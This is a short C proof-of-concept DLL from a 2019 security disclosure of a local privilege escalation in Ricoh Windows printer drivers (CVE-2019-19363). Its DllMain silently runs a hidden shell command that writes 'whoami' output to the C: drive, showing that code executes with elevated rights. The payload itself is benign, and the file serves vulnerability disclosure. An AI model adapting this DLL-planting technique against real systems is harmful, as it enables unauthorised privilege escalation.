/*

This proof of concept DLL executes a shell command with elevated privileges.
Written by Pentagrid AG, 2019.
Cf. https://pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/
*/

//#include "stdafx.h"
#include <shellapi.h>

BOOL WINAPI DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved) {
    WinExec("cmd.exe /c whoami > c:\\result.txt", SW_HIDE);
    return TRUE;
}
